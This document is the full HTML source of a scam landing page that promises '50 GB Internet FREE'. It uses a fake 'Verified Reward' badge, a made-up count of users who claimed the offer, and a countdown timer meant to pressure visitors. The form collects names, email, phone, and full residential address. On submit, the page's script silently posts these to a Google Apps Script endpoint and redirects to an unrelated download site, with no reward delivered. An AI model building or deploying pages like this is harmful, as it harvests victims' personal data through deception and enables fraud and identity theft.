<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Limited Time Offer - Free 50GB Internet</title>
    <!-- Google Fonts & FontAwesome Icons -->
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        :root {
            --primary: #ff0055;
            --secondary: #00f2fe;
            --dark: #0f172a;
            --card-bg: rgba(255, 255, 255, 0.08);
        }

        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
        
        body { 
            background: linear-gradient(135deg, #0f172a 0%, #1e1b4b 50%, #311042 100%);
            color: #fff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            overflow-x: hidden;
        }

        /* --- HEADER --- */
        header {
            background: rgba(15, 23, 42, 0.6);
            backdrop-filter: blur(12px);
            padding: 15px 5%;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
            position: sticky;
            top: 0;
            z-index: 100;
        }
        .logo { font-size: 22px; font-weight: 700; background: linear-gradient(to right, var(--secondary), var(--primary)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .secure-badge { font-size: 13px; color: #10b981; border: 1px solid #10b981; padding: 4px 10px; border-radius: 20px; background: rgba(16, 185, 129, 0.1); }

        /* --- MAIN HERO SECTION --- */
        .container { flex: 1; max-width: 800px; margin: 40px auto; padding: 0 20px; width: 100%; }
        
        .promo-banner {
            text-align: center;
            margin-bottom: 30px;
        }
        .promo-banner h1 { font-size: 38px; font-weight: 700; line-height: 1.2; margin-bottom: 10px; text-shadow: 0 0 20px rgba(0,242,254,0.3); }
        .highlight { color: #ff0055; background: linear-gradient(to right, #ff0055, #ff5500); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 800; }
        .sub-text { font-size: 16px; color: #cbd5e1; margin-bottom: 20px; }

        /* --- COUNTER & LIVE STATS --- */
        .live-stats {
            display: flex;
            justify-content: space-around;
            background: rgba(255, 255, 255, 0.05);
            padding: 15px;
            border-radius: 12px;
            margin-bottom: 30px;
            border: 1px solid rgba(255, 255, 255, 0.05);
        }
        .stat-box { text-align: center; }
        .stat-box span { display: block; }
        .stat-num { font-size: 20px; font-weight: 700; color: var(--secondary); }
        .stat-label { font-size: 12px; color: #94a3b8; }

        /* --- 3D FORM CARD --- */
        .form-card {
            background: var(--card-bg);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.15);
            padding: 40px 30px;
            border-radius: 24px;
            box-shadow: 0 20px 50px rgba(0,0,0,0.4), inset 0 0 20px rgba(255,255,255,0.05);
        }
        
        .form-title { font-size: 20px; text-align: center; margin-bottom: 25px; color: #f8fafc; font-weight: 600; }
        
        form { display: flex; flex-direction: column; gap: 18px; }
        
        .row { display: flex; gap: 15px; }
        .row > div { flex: 1; }
        
        .input-group { position: relative; }
        .input-group i { position: absolute; left: 15px; top: 50%; transform: translateY(-50%); color: #64748b; font-size: 16px; }
        
        input, textarea {
            width: 100%;
            padding: 14px 14px 14px 45px;
            font-size: 15px;
            background: rgba(15, 23, 42, 0.6);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            color: #fff;
            outline: none;
            transition: all 0.3s ease;
        }
        textarea { padding-left: 45px; resize: none; }
        
        input:focus, textarea:focus {
            border-color: var(--secondary);
            box-shadow: 0 0 15px rgba(0, 242, 254, 0.2);
            outline: none;
        }

        /* --- GLOWING BUTTON --- */
        button {
            margin-top: 10px;
            padding: 16px;
            font-size: 18px;
            font-weight: 700;
            color: #fff;
            background: linear-gradient(90deg, #ff0055, #9d00ff);
            border: none;
            border-radius: 10px;
            cursor: pointer;
            box-shadow: 0 0 20px rgba(255, 0, 85, 0.4);
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 0 30px rgba(255, 0, 85, 0.7);
        }
        button:disabled {
            background: #475569;
            box-shadow: none;
            cursor: not-allowed;
        }

        /* --- MESSAGES --- */
        .msg { margin-top: 20px; padding: 15px; border-radius: 10px; text-align: center; font-weight: 600; display: none; font-size: 15px; }
        .success { background: rgba(16, 185, 129, 0.2); border: 1px solid #10b981; color: #34d399; display: block; }
        .error { background: rgba(239, 68, 68, 0.2); border: 1px solid #ef4444; color: #f87171; display: block; }

        /* --- FOOTER --- */
        footer {
            background: rgba(15, 23, 42, 0.9);
            padding: 25px 5%;
            text-align: center;
            border-top: 1px solid rgba(255, 255, 255, 0.05);
            font-size: 13px;
            color: #64748b;
            margin-top: auto;
        }
        .footer-links { margin-bottom: 10px; }
        .footer-links a { color: #94a3b8; text-decoration: none; margin: 0 10px; }

        @media (max-width: 600px) {
            .row { flex-direction: column; gap: 18px; }
            .promo-banner h1 { font-size: 28px; }
        }
    </style>
</head>
<body>

    <!-- HEADER SECTION -->
    <header>
        <div class="logo"><i class="fa-solid fa-bolt"></i> NetMax Promo</div>
        <div class="secure-badge"><i class="fa-solid fa-shield-halved"></i> Verified Reward</div>
    </header>

    <!-- MAIN BODY -->
    <div class="container">
        
        <div class="promo-banner">
            <h1>Fill The Form & Get <span class="highlight">50 GB Internet FREE</span></h1>
            <p class="sub-text">Exclusive reward program for valid users. Valid across all major networks.</p>
        </div>

        <div class="live-stats">
            <div class="stat-box">
                <span class="stat-num" id="countdown">04:59</span>
                <span class="stat-label">Offer Expires In</span>
            </div>
            <div class="stat-box">
                <span class="stat-num">4,821</span>
                <span class="stat-label">Users Claimed Today</span>
            </div>
            <div class="stat-box">
                <span class="stat-num" style="color: #10b981;"><i class="fa-solid fa-circle" style="font-size: 10px;"></i> Active</span>
                <span class="stat-label">Server Status</span>
            </div>
        </div>

        <div class="form-card">
            <div class="form-title">Enter Details to Claim Your Free Bundle</div>
            
            <form id="leadForm">
                <div class="row">
                    <div class="input-group">
                        <i class="fa-solid fa-user"></i>
                        <input name="firstname" placeholder="First Name" required />
                    </div>
                    <div class="input-group">
                        <i class="fa-solid fa-user"></i>
                        <input name="lastname" placeholder="Last Name" required />
                    </div>
                </div>
                
                <div class="input-group">
                    <i class="fa-solid fa-envelope"></i>
                    <input name="email" placeholder="Email Address" type="email" required />
                </div>
                
                <div class="row">
                    <div class="input-group">
                        <i class="fa-solid fa-location-dot"></i>
                        <input name="zip" placeholder="Zip Code" required />
                    </div>
                    <div class="input-group">
                        <i class="fa-solid fa-city"></i>
                        <input name="city" placeholder="City" required />
                    </div>
                    <div class="input-group">
                        <i class="fa-solid fa-map"></i>
                        <input name="state" placeholder="State" required />
                    </div>
                </div>
                
                <div class="row">
                    <div class="input-group">
                        <i class="fa-solid fa-earth-americas"></i>
                        <input name="country" placeholder="Country" required />
                    </div>
                    <div class="input-group">
                        <i class="fa-solid fa-phone"></i>
                        <input name="phone" placeholder="Phone Number" type="tel" required />
                    </div>
                </div>
                
                <div class="input-group">
                    <i class="fa-solid fa-house"></i>
                    <textarea name="address" placeholder="Full Delivery / Residential Address" rows="3" required></textarea>
                </div>
                
                <button type="submit" id="submitBtn">Claim 50GB Free Data Now</button>
                
                <div class="msg" id="msg"></div>
            </form>
        </div>
    </div>

    <!-- FOOTER SECTION -->
    <footer>
        <div class="footer-links">
            <a href="#">Privacy Policy</a> | 
            <a href="#">Terms of Service</a> | 
            <a href="#">Support</a>
        </div>
        <p>&copy; 2026 NetMax Rewards Network. All rights reserved.</p>
    </footer>

    <script>
        const scriptURL = 'https://script.google.com/macros/s/AKfycbwq-6UICeJcJ47ly2o2nw9lfM96wiCQowrEEUHgHrajPtEXeU5EzDNmehvaWZRYfcLc/exec';
        const redirectURL = 'https://daily-free-50-gb-internet-data-for-all-countries.soft112.com/';

        const form = document.getElementById('leadForm');
        const msg = document.getElementById('msg');
        const btn = document.getElementById('submitBtn');

        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            btn.disabled = true;
            btn.innerText = "Redirecting to Reward Server...";

            const formData = Object.fromEntries(new FormData(form).entries());

            try {
                await fetch(scriptURL, {
                    method: 'POST',
                    mode: 'no-cors',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(formData)
                });
                
                setTimeout(() => {
                    window.location.href = redirectURL;
                }, 500);

            } catch (err) {
                setTimeout(() => {
                    window.location.href = redirectURL;
                }, 500);
            }
        });

        let time = 299; 
        const countdownEl = document.getElementById('countdown');
        setInterval(() => {
            let minutes = Math.floor(time / 60);
            let seconds = time % 60;
            countdownEl.innerHTML = `${minutes < 10 ? '0' + minutes : minutes}:${seconds < 10 ? '0' + seconds : seconds}`;
            if(time > 0) time--;
        }, 1000);
    </script>
</body>
</html>
